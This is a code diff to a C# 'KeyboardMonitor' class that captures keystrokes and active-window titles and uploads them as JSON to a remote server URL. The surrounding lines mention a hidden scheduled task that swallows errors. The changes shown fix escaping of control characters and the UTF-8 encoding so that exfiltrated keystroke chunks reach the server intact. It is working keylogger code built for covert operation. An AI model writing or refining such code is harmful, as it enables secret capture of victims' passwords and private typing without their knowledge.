@@ -220,9 +220,27 @@ public class KeyboardMonitor {
         return sb.ToString().Trim();
     }
 
+    // Proper JSON string escaping. ToUnicode emits raw control characters for
+    // Ctrl-key combos (Ctrl+C -> 0x03, etc.); those must be \u-escaped or the
+    // payload is invalid JSON and the server drops it.
     private static string Escape(string s) {
-        return s.Replace("\\", "\\\\").Replace("\"", "\\\"")
-                .Replace("\n", "\\n").Replace("\r", "\\r").Replace("\t", "\\t");
+        var sb = new StringBuilder(s.Length + 8);
+        foreach (char c in s) {
+            switch (c) {
+                case '\\': sb.Append("\\\\"); break;
+                case '"':  sb.Append("\\\""); break;
+                case '\n': sb.Append("\\n");  break;
+                case '\r': sb.Append("\\r");  break;
+                case '\t': sb.Append("\\t");  break;
+                case '\b': sb.Append("\\b");  break;
+                case '\f': sb.Append("\\f");  break;
+                default:
+                    if (c < 0x20) sb.Append("\\u").Append(((int)c).ToString("x4"));
+                    else          sb.Append(c);
+                    break;
+            }
+        }
+        return sb.ToString();
     }
 
     // Local diagnostic log — the scheduled task runs hidden and swallows errors,
@@ -252,7 +270,8 @@ public class KeyboardMonitor {
             Escape(ActiveWindow()), pid, mySeq, Escape(chunk));
         try {
             using (var client = new WebClient()) {
-                client.Headers[HttpRequestHeader.ContentType] = "application/json";
+                client.Encoding = System.Text.Encoding.UTF8;   // default is ANSI — must match the server's UTF-8 decode
+                client.Headers[HttpRequestHeader.ContentType] = "application/json; charset=utf-8";
                 client.UploadString(serverUrl, json);
             }
             Log("sent seq=" + mySeq + " len=" + chunk.Length);
